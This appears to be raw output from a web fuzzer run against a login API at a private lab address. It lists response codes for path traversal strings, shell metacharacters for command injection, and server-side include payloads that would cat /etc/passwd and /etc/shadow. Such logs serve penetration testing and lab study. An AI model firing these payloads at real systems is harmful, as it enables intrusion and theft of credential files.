Target: http://10.10.10.16/api/login
Total requests: 468
==============================================================================================================================================
ID    C.Time   Response   Lines      Word         Chars                  Server                                             Redirect   Payload    
==============================================================================================================================================
00109:  0.049s   C=00109:  C=200      0 L	       2 W	     21 Ch                                                                              "/../../../../../../../../bin/id|"
00156:  0.050s   C=00156:  C=200      0 L	       2 W	     21 Ch                                                                              "||"
00157:  0.050s   C=00157:  C=200      0 L	       2 W	     21 Ch                                                                              "`"
00158:  0.050s   C=00158:  C=200      0 L	       2 W	     21 Ch                                                                              "-"
00115:  0.050s   C=00115:  C=200      0 L	       2 W	     21 Ch                                                                              "../../../../../../../../../../../../localstart.asp"
00153:  0.050s   C=00153:  C=200      0 L	       2 W	     21 Ch                                                                              "<<"
00154:  0.050s   C=00154:  C=200      0 L	       2 W	     21 Ch                                                                              "<<<"
00155:  0.098s   C=00155:  C=200      0 L	       2 W	     21 Ch                                                                              "|"
00152:  0.050s   C=00152:  C=200      0 L	       2 W	     21 Ch                                                                              "<"
00146:  0.050s   C=00146:  C=200      0 L	       2 W	     21 Ch                                                                              "\\\\*"
00149:  0.048s   C=00149:  C=400      0 L	       2 W	     21 Ch                                                                              "&lt;"
00148:  0.048s   C=00148:  C=400      0 L	       2 W	     21 Ch                                                                              "&lt"
00150:  0.049s   C=00150:  C=400      0 L	       2 W	     21 Ch                                                                              "&LT"
00151:  0.049s   C=00151:  C=400      0 L	       2 W	     21 Ch                                                                              "&LT;"
00147:  0.048s   C=00147:  C=200      0 L	       2 W	     21 Ch                                                                              "\\\\?\\"
00145:  0.050s   C=00145:  C=200      0 L	       2 W	     21 Ch                                                                              "\\/"
00143:  0.051s   C=00143:  C=200      0 L	       2 W	     21 Ch                                                                              "\"
00144:  0.052s   C=00144:  C=200      0 L	       2 W	     21 Ch                                                                              "\\"
00142:  0.052s   C=00142:  C=200      0 L	       2 W	     21 Ch                                                                              "/"
00135:  0.051s   C=00135:  C=400      0 L	       2 W	     21 Ch                                                                              "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/passwd&quot;--&gt;"
00136:  0.052s   C=00136:  C=400      0 L	       2 W	     21 Ch                                                                              "&lt;!--#exec%20cmd=&quot;/bin/cat%20/etc/shadow&quot;--&gt;"
00140:  0.052s   C=00140:  C=200      0 L	       2 W	     21 Ch                                                                              "}"
00141:  0.053s   C=00141:  C=400      0 L	       2 W	     21 Ch                                                                              ";"
00137:  0.052s   C=00137:  C=400      0 L	       2 W	     21 Ch                                                                              "%"
00138:  0.052s   C=00138:  C=200      0 L	       2 W	     21 Ch                                                                              "#"
00134:  0.050s   C=00134:  C=400      0 L	       2 W	     21 Ch                                                                              "/,%ENV,/"
00133:  0.049s   C=00133:  C=200      0 L	       2 W	     21 Ch                                                                              "%01%02%03%04%0a%0d%0aADSF"
00132:  0.051s   C=00132:  C=400      0 L	       2 W	     21 Ch                                                                              "!@#0%^#0##018387@#0^^**(()"
00130:  0.051s   C=00130:  C=200      0 L	       2 W	     21 Ch                                                                              "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/boot.ini"
